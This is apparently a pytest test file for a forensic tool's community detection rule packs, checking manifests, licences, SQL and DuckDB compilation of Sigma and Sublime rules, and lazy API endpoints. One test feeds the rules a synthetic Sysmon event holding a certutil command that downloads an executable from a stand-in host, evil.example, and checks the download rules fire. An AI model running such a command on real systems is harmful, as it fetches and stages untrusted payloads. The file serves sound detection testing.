"""Community rule packs (rules/community): manifests, both-engine validity, lazy endpoints, prefilter coverage."""
from __future__ import annotations

import json
import re
import uuid
from pathlib import Path

import pytest
import yaml
from django.test import Client

from services.rules import packs
from services.store import rules as R
from services.store.casestore import StoreRegistry
from services.store.sqlfilter import Ctx, compile_cond
from services.store.writers import EventWriter

HDR = {"HTTP_X_FORENSIC_CLIENT": "1"}
ROOT = Path(__file__).resolve().parents[2]
RULES = ROOT / "rules"
COMMUNITY = RULES / "community"
EXPECTED = {"sigma-windows", "sigma-emerging-threats", "sigma-threat-hunting", "sublime"}


def _core_ids() -> set[str]:
    ids: set[str] = set()
    for path in RULES.rglob("*.yaml"):
        if "community" in path.relative_to(RULES).parts:
            continue
        for d in yaml.safe_load_all(path.read_text(encoding="utf-8")):
            if isinstance(d, dict) and d.get("id"):
                ids.add(str(d["id"]))
    return ids


def test_manifests_licences_and_counts_agree():
    lst = packs.list_packs()
    assert EXPECTED <= {p["id"] for p in lst}
    for p in lst:
        d = COMMUNITY / p["id"]
        assert (d / "LICENSE").is_file(), f"{p['id']}: upstream licence must ship with the rules"
        assert (d / "skipped.json").is_file()
        assert re.fullmatch(r"[0-9a-f]{40}", p["upstream"]["sha"]), f"{p['id']}: pack.json must name the upstream commit"
        assert p["license"]["name"] and p["source"] in ("events", "mails") and isinstance(p["defaultEnabled"], bool)
        data = packs.load_pack(p["id"])
        assert data is not None and data["pack"]["hash"] == p["hash"]
        assert not [r for r in data["rules"] if "error" in r]
        rules = [r for r in data["rules"] if "rule" in r]
        assert len(rules) == p["counts"]["converted"] == sum(p["files"].values()), p["id"]
        assert all("yaml" not in r for r in rules)  # the client re-dumps; no duplicated text on the wire
        skipped = json.loads((d / "skipped.json").read_text(encoding="utf-8"))
        assert len(skipped) == p["counts"]["skipped"] and all(s["reason"] for s in skipped)
        assert packs.load_pack(p["id"]) is data  # cached until a file changes
    assert packs.load_pack("nope") is None and packs.load_pack("../windows") is None and packs.license_text("..") is None


def test_every_pack_rule_compiles_on_the_sql_engine_with_unique_ids():
    seen = _core_ids()
    for p in packs.list_packs():
        no_prefilter = 0
        rules = [r["rule"] for r in packs.load_pack(p["id"])["rules"] if "rule" in r]
        for rule in rules:
            assert rule["id"] not in seen, f"duplicate rule id {rule['id']}"
            seen.add(rule["id"])
            assert rule["source"] == p["source"] and rule.get("severity") in ("info", "low", "medium", "high", "critical") and rule.get("title")
            compile_cond(rule["where"], Ctx(source=p["source"]))
            if rule.get("exclude"):
                compile_cond(rule["exclude"], Ctx(source=p["source"]))
            if p["source"] == "events" and R._rule_event_ids(rule["where"]) is None:
                no_prefilter += 1
        if p["source"] == "events":
            # the browser engine reads events through the [caseId+eventId] index; a full scan per rule would not scale
            assert no_prefilter <= max(3, len(rules) // 100), f"{p['id']}: {no_prefilter} of {len(rules)} rules cannot be pre-filtered by event id"


def test_every_pack_rule_binds_in_duckdb(store):
    """compile_cond can succeed on SQL that DuckDB's binder rejects (an empty JSON key did); run each WHERE."""
    cur = store.cursor()
    for p in packs.list_packs():
        for r in packs.load_pack(p["id"])["rules"]:
            rule = r.get("rule")
            if not rule:
                continue
            for key in ("where", "exclude"):
                if rule.get(key):
                    ctx = Ctx(source=p["source"])
                    sql = compile_cond(rule[key], ctx)
                    try:
                        cur.execute(f"SELECT count(*) FROM {p['source']} WHERE {sql}", ctx.params).fetchone()
                    except Exception as exc:  # noqa: BLE001
                        raise AssertionError(f"{rule['id']} ({key}): {exc}") from exc


def test_all_of_members_pin_event_ids():
    assert R._rule_event_ids({"all_of": [{"channel|contains": "sysmon", "eventId": 1}, {"image|endswith": "x.exe"}]}) == [1]
    assert R._rule_event_ids({"all_of": [{"any_of": [{"eventId": 1}, {"eventId": 4688}]}, {"eventId|in": [1, 7]}]}) == [1]  # intersection
    assert R._rule_event_ids({"all_of": [{"any_of": [{"eventId": 1}, {"eventId": 4688}]}, {"eventId": 7045}]}) == [1, 4688]  # disjoint: keep the first
    assert R._rule_event_ids({"all_of": [{"image|endswith": "x"}]}) is None


def test_meta_lists_packs_but_serves_their_rules_lazily():
    c = Client()
    m = c.get("/api/meta", **HDR).json()
    assert EXPECTED <= {p["id"] for p in m["packs"]}
    assert not [r for r in m["rules"] if str(r["file"]).startswith("community/")]
    lst = c.get("/api/rules/packs", **HDR).json()["packs"]
    assert {p["id"] for p in lst} == {p["id"] for p in m["packs"]}
    r = c.get("/api/rules/packs/sublime", **HDR)
    assert r.status_code == 200
    body = r.json()
    assert body["pack"]["id"] == "sublime" and len(body["rules"]) == body["pack"]["counts"]["converted"]
    assert all(x["rule"]["source"] == "mails" for x in body["rules"])
    assert c.get("/api/rules/packs/nope", **HDR).status_code == 404
    lic = c.get("/api/rules/packs/sigma-windows/license", **HDR)
    assert lic.status_code == 200 and b"Detection Rule License" in lic.content
    assert c.get("/api/rules/packs/nope/license", **HDR).status_code == 404


def _ev(**kw):
    base = {"ts": 1_725_000_000_000, "tsIso": "2026-09-01T00:00:00Z", "computer": "PC1", "level": 4, "data": {}}
    base.update(kw)
    base["raw"] = json.dumps({"Event": {"EventData": base["data"], "System": {"EventID": base.get("eventId")}}})
    return base


@pytest.fixture
def store(tmp_path):
    reg = StoreRegistry()
    reg.configure(tmp_path / "cases")
    st = reg.get(str(uuid.uuid4()))
    yield st
    reg.close_all()


def test_shipped_sigma_rules_fire_on_matching_events(store):
    rules = [r["rule"] for r in packs.load_pack("sigma-windows")["rules"] if "rule" in r]
    certutil = [r for r in rules if "certutil" in r["title"].lower()]
    assert len(certutil) >= 3
    w = EventWriter(store, 1)
    sysmon = "Microsoft-Windows-Sysmon/Operational"
    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", originalFileName="CertUtil.exe",
              commandLine="certutil.exe -urlcache -split -f http://evil.example/a.exe C:\\Users\\Public\\a.exe", parentImage=r"C:\Windows\System32\cmd.exe"))
    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\notepad.exe", commandLine="notepad.exe", parentImage=r"C:\Windows\explorer.exe"))
    w.flush()
    res = R.run_rules(store, certutil, {})
    assert not res["errors"], res["errors"]
    fired = {rid for rid, n in res["byRule"].items() if n}
    assert fired, "the certutil download rules should match the urlcache event"
    assert all(f["refs"] == [1] for f in res["findings"])
